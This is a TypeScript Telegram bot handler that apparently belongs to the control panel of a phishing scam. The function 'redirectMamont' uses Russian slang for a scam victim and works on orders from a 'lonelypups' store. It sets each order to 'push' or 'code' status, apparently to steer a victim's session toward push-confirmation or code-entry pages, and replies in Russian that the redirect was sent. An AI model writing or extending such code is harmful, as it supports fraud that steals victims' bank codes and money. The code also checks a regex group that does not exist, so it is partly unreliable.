import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {lonelyRepository} from "@/database/lonelypups";

const regex = /log\s+redirect\s+(?<type>.+)\s+(?<order>\d+)/gmsi
export const composer = new Composer<Context>()
composer.callbackQuery(regex, redirectMamont)

export async function redirectMamont(ctx: Context)  {
    const match = regex.exec(ctx.match[0])
    const log = await lonelyRepository.getOrder(Number(match.groups.order))

    if (match.groups.msgDelete === 'true') {
        await ctx.api.deleteMessage(ctx.callbackQuery.from.id, ctx.callbackQuery.message.message_id)
    }

    if (match.groups.type === "push")
        await lonelyRepository.setOrder(Number(match.groups.order), {
            status: "push"
        })

    // if (match.groups.type === "error")
    //     await lonelyRepository.setOrder(Number(match.groups.order), {
    //         status: "wait",
    //         error: 'text'
    //     })

    if (match.groups.type === "push-code")
        await lonelyRepository.setOrder(Number(match.groups.order), {
            status: "code"
        })

    await ctx.reply(`
#ID_${log.id}
    
👍 Запрос на редирект "${match.groups.type}" успешно отправлен
`, {
        reply_to_message_id: ctx.callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                [{text: "Закрыть",callback_data: 'deleteThisMessage'}]
            ]
        }
    })

}